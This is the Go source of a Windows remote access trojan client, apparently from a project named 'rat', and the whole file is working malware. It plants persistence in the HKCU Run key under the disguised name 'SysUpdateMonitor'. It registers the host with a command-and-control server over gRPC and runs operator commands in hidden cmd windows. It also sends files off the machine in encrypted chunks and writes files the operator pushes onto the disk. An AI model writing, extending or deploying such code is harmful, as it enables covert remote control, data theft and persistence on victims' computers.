package main

import (
	"bufio"
	"context"
	"io"
	"os"
	"os/exec"
	"syscall"
	"time"

	"rat/internal/crypto"
	pb "rat/internal/proto"

	"github.com/google/uuid"
	"golang.org/x/sys/windows/registry"
	"golang.org/x/text/encoding/charmap"
	"golang.org/x/text/transform"
	"google.golang.org/grpc"
	"google.golang.org/grpc/credentials/insecure"
	"google.golang.org/protobuf/proto"
)

const CHUNK_SIZE = 512 * 1024

var (
	C2         string
	ClientId   = uuid.New().String()
	SessionKey []byte
)

func cp866ToUTF8(b []byte) string {
	result, _, err := transform.Bytes(charmap.CodePage866.NewDecoder(), b)
	if err != nil {
		return string(b)
	}
	return string(result)
}

func ensurePersistence() {
	exe, err := os.Executable()
	if err != nil {
		return
	}
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return
	}
	defer k.Close()
	if val, _, err := k.GetStringValue("SysUpdateMonitor"); err != nil || val != exe {
		k.SetStringValue("SysUpdateMonitor", exe)
	}
}

func runClient() {
	conn, err := grpc.NewClient(C2, grpc.WithTransportCredentials(insecure.NewCredentials()))
	if err != nil {
		return
	}
	defer conn.Close()
	client := pb.NewClientServiceClient(conn)
	if !handshake(client) {
		return
	}
	for {
		cntx, cancel := context.WithTimeout(context.Background(), 20*time.Second)
		envelope, err := client.GetTask(cntx, &pb.PollRequest{ClientId: ClientId})
		cancel()
		if err != nil {
			time.Sleep(2 * time.Second)
			continue
		}
		if len(envelope.EncryptedData) > 0 {
			processTask(client, envelope)
		}
		time.Sleep(time.Second)
	}
}

func handshake(client pb.ClientServiceClient) bool {
	priv, pub, err := crypto.GenKeyPair()
	if err != nil {
		return false
	}
	hostname, _ := os.Hostname()
	resp, err := client.Register(context.Background(), &pb.RegisterRequest{
		ClientId: ClientId, Hostname: hostname, Os: "Windows", PublicKey: pub,
	})
	if err != nil {
		return false
	}
	SessionKey, err = crypto.GetAESKey(priv, resp.PublicKey)
	return err == nil
}

func processTask(client pb.ClientServiceClient, env *pb.TaskEnvelope) {
	data, err := crypto.Decrypt(env.EncryptedData, env.InitV, SessionKey)
	if err != nil {
		return
	}
	var task pb.Task
	if err := proto.Unmarshal(data, &task); err != nil {
		return
	}
	stream, err := client.SendResult(context.Background())
	if err != nil {
		return
	}
	switch task.Type {
	case "cmd":
		cmd := exec.Command("cmd", "/C", task.Command)
		cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
		out, err := cmd.CombinedOutput()
		errStr := ""
		if err != nil {
			errStr = err.Error()
		}
		sendResult(stream, task.TaskId, task.Command, cp866ToUTF8(out), errStr)
	case "download":
		sendFile(stream, task.TaskId, task.Command, task.FilePath)
	case "upload":
		receiveFile(stream, &task)
	}
	stream.CloseAndRecv()
}

func receiveFile(stream pb.ClientService_SendResultClient, task *pb.Task) {
	if len(task.FileData) == 0 {
		sendResult(stream, task.TaskId, task.Command, "", "no file data")
	}
	savePath := task.FilePath
	if savePath == "" {
		savePath = task.FileName
	}
	if savePath == "" {
		sendResult(stream, task.TaskId, task.Command, "", "no target path")
		return
	}
	if err := os.WriteFile(savePath, task.FileData, 0644); err != nil {
		sendResult(stream, task.TaskId, task.Command, "", err.Error())
		return
	}
	sendResult(stream, task.TaskId, task.Command, "file saved: "+savePath, "")
}

func sendFile(stream pb.ClientService_SendResultClient, taskId, command, path string) {
	info, err := os.Stat(path)
	if err != nil {
		if os.IsNotExist(err) {
			sendResult(stream, taskId, command, "", "not found: "+path)
		} else {
			sendResult(stream, taskId, command, "", err.Error())
		}
		return
	}
	if info.IsDir() {
		sendResult(stream, taskId, command, "", path+" is a dir")
		return
	}
	f, err := os.Open(path)
	if err != nil {
		sendResult(stream, taskId, command, "", err.Error())
		return
	}
	defer f.Close()
	buf := make([]byte, CHUNK_SIZE)
	reader := bufio.NewReader(f)
	isLast := false
	for !isLast {
		n, err := reader.Read(buf)
		if err != nil && err != io.EOF {
			sendResult(stream, taskId, command, "", err.Error())
			return
		}
		isLast = (err == io.EOF || n == 0)
		chunk := buf[:n]
		if n == 0 {
			chunk = []byte{}
		}
		res := &pb.TaskResult{
			TaskId:    taskId,
			Command:   command,
			FileName:  path,
			FileChunk: chunk,
			IsLast:    isLast,
		}
		data, err := proto.Marshal(res)
		if err != nil {
			return
		}
		enc, initV, err := crypto.Encrypt(data, SessionKey)
		if err != nil {
			return
		}
		stream.Send(&pb.ResultEnvelope{
			ClientId: ClientId, EncryptedData: enc, InitV: initV,
		})
		if isLast {
			break
		}
	}
}

func sendResult(stream pb.ClientService_SendResultClient, taskId, command, out, errStr string) {
	res := &pb.TaskResult{
		TaskId:  taskId,
		Command: command,
		Output:  out,
		Error:   errStr,
	}
	data, err := proto.Marshal(res)
	if err != nil {
		return
	}
	enc, initV, err := crypto.Encrypt(data, SessionKey)
	if err != nil {
		return
	}
	stream.Send(&pb.ResultEnvelope{
		ClientId: ClientId, EncryptedData: enc, InitV: initV,
	})
}

func main() {
	ensurePersistence()

	for {
		runClient()
		time.Sleep(5 * time.Second)
	}
}
